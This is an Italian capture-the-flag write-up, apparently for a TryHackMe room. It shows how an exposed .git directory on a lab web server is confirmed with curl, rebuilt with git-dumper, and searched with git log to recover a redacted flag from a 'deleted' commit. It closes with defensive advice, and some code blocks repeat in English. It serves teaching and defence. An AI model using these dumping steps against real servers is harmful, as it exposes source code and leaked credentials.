Room 404: quando il .git finisce in produzione

«Dumpa il sorgente esposto e trova la flag», dice la room. Sulla carta è facile, e in effetti lo è — ma la lezione vera non è che il codice sorgente sia esposto, è che un innocuo .git in produzione consegna l'intera storia del progetto, inclusi i segreti che lo sviluppatore credeva di aver cancellato. Si continua da dove eravamo rimasti al Day 01: la piattaforma guest del Byte Lotus è andata online di corsa e lo sviluppatore del turno di notte ha spedito più del previsto.

// TL;DR
  • Recon: curl -i .git/HEAD come canarino — un 200 conferma il .git esposto.
  • Dump: git-dumper ricostruisce il repo dagli oggetti/ref, senza directory listing.
  • History: git log --all -p (o il pickaxe -S 'THM{') trova la flag in un commit «ripulito».
  • Difesa: deploya l'app buildata, mai la cartella col .git; riscrivi la history e ruota i segreti.

[01] Recon: il canarino .git/HEAD

Prima di tirare fuori qualsiasi tool di dumping, un controllo di sanità: il .git è davvero servito dal web server? Una singola richiesta risponde alla domanda.

# Canary: .git/HEAD è minuscolo e innocuo, perfetto per il test
curl -i http://<target>:8080/.git/HEAD

HTTP/1.1 200 OK
ref: refs/heads/main   # headers variano col server; conta il body
# Canary: .git/HEAD is tiny and harmless, perfect for the check
curl -i http://<target>:8080/.git/HEAD

HTTP/1.1 200 OK
ref: refs/heads/main   # headers vary by server; the body is what matters
// nota

.git/HEAD è un canarino ideale: è un file minuscolo presente in ogni repo. Se il server lo restituisce invece di un 404, hai la conferma che l'intera directory .git è raggiungibile. Lo stesso ragionamento vale per .svn/, .DS_Store, .env e i backup dimenticati.

[02] Dump: ricostruire il repo con git-dumper

Esposizione confermata. Ora ricostruisco l'intero repository con git-dumper, che fa il lavoro sporco al posto mio e mi restituisce un repo locale del tutto normale.

# git-dumper ricostruisce il repo dagli oggetti/ref/pack
pip install git-dumper --break-system-packages
git-dumper http://<target>:8080/.git/ ./bytelotus
# git-dumper rebuilds the repo from objects/refs/packs
pip install git-dumper --break-system-packages
git-dumper http://<target>:8080/.git/ ./bytelotus

Nessun directory listing? Non serve. git-dumper parte da .git/HEAD e .git/refs, legge packed-refs e objects/info/packs, poi cammina il grafo degli oggetti scaricandoli uno a uno. Git è un archivio content-addressable: basta conoscere gli hash — che vivono nei ref e nei pack — per tirare giù l'intero database. Il risultato è un repo identico a un git clone.

[03] History: la flag vive nei vecchi commit

Controllare solo lo stato corrente dei file (HEAD) è l'errore da principianti. Il valore di un repo dumpato è la sua storia: cammino tutti i commit, con i diff, su tutti i branch.

# --all: ogni branch/ref, non solo HEAD
# -p: mostra il diff completo di ogni commit
cd bytelotus
git log --all -p | less

# Scorciatoia: pickaxe per saltare dritto al commit del segreto
git log --all -p -S 'THM{'
# --all: every branch/ref, not just HEAD
# -p: show the full diff of every commit
cd bytelotus
git log --all -p | less

# Shortcut: pickaxe to jump straight to the secret's commit
git log --all -p -S 'THM{'
// nota

Non fermarti a HEAD: un segreto può vivere su un branch mai unito. Il flag --all copre ogni ref, e il pickaxe -S 'THM{' ti porta esattamente al commit in cui la stringa è comparsa o sparita — molto più veloce che scrollare a mano dentro less.

[04] Flag e difesa

La flag spunta nel diff di un vecchio commit, poi «ripulito» su HEAD. Il pickaxe la mostra come riga rimossa dal commit che ha finto di cancellarla.

# La flag vive in un vecchio commit, poi «rimossa» su HEAD
git log --all -p -S 'THM{'

# nel diff di un vecchio commit ricompare la riga poi «rimossa» su HEAD:
-    FLAG = "THM{████████████████████}"
# The flag lives in an old commit, then "removed" on HEAD
git log --all -p -S 'THM{'

# in an old commit's diff the removed line reappears (later 'cleaned' on HEAD):
-    FLAG = "THM{████████████████████}"
// flag — OSCURATA
THM{████████████████████}

La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo Enter lo batti tu.

La parte interessante è perché funziona: git non cancella nulla davvero. Quando lo sviluppatore ha «rimosso» il segreto in un commit successivo, ha solo creato un nuovo commit che non lo contiene più. Il blob con la credenziale resta nell'object database, indicizzato dal suo hash, finché non riscrivi la history e fai git gc. Il diff di ieri è per sempre.

// lezione

Deploya l'app buildata/esportata, mai la cartella di progetto: così il .git non finisce in produzione (e, se proprio deve, blocca .git/ a livello di web server). Rimuovere un segreto in un commit successivo dà una falsa sicurezza — resta nell'object database finché non riscrivi la history con git filter-repo. E soprattutto: se una credenziale è stata online, considerala compromessa e ruotala.
